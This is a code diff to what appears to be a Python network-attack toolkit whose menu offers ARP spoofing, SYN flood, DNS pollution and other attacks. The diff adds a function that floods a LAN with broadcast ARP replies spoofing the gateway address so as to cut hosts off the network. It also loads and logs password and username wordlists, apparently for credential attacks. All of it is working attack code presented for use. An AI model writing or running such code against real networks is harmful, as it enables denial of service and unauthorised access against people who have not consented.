@@ -123,14 +123,22 @@ password_list = []
 file = open('pass.txt','r')
 for i in file:
     password_list.append(i)
+    logging.info("password list add " + i.replace("\n",""))
 file.close()
 
 print("password list read...Done")
+
+file = open('user_list.txt','r')
+user_name_list =[]
+for i in file:
+    user_name_list.append(i.replace("\n",""))
+    logging.info("user list add " + i.replace("\n",""))
 
 file = open("server_dir_dictionary.txt",'r',encoding='utf-8')#读取服务器后台目录字典
 server_dir_dictionary = []
 for i in file:
     server_dir_dictionary.append("/" + i.replace("\n",""))#一定要替换\n
+    logging.info("server dir dictionary add " + i.replace("\n",""))
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'}
 progress = progressbar.ProgressBar()
 class ARP_poof():
@@ -253,6 +261,18 @@ class ARP_poof():
                 time.sleep(1)
             except KeyboardInterrupt:
                 break
+
+def Paralysis_the_network():
+    if chinses_mode:
+        router = input("请输入网关IP:")
+    else:
+        router = input("enter router IP:")
+    while True:
+        try:
+            sendp(Ether(dst="ff:ff:ff:ff:ff:ff",src=mac)/ARP(psrc=router,pdst="1.1.1.1",op=2))
+            time.sleep(0.1)
+        except KeyboardInterrupt:
+            break
 
 def SYN_flood(): #SYN flood attack SYN洪水不用我说把
     if chinses_mode:
@@ -532,6 +552,7 @@ while True:#喜闻乐见的主循环
         print("DNS pollution(12)")
         print("land attack(13)")
         print("server background scan(14)")
+        print("Paralysis the network(15)")
     if chinses_mode:
         print("退出(0)")
         print("ARP欺骗(1)")
@@ -548,6 +569,7 @@ while True:#喜闻乐见的主循环
         print("DNS污染(12)")
         print("land攻击(这个攻击很古老了 13)")
         print("服务器后台扫描(14)")
+        print("瘫痪网络系统(ARP广播攻击 15)")
     if chinses_mode:
         print("--------------------插件--------------------")
     else:
@@ -627,6 +649,8 @@ while True:#喜闻乐见的主循环
         land_attack()
     elif choose == 14:
         Server_background_scan()
+    elif choose == 15:
+        Paralysis_the_network()
     elif choose == 'debug':
         debug()
     else:
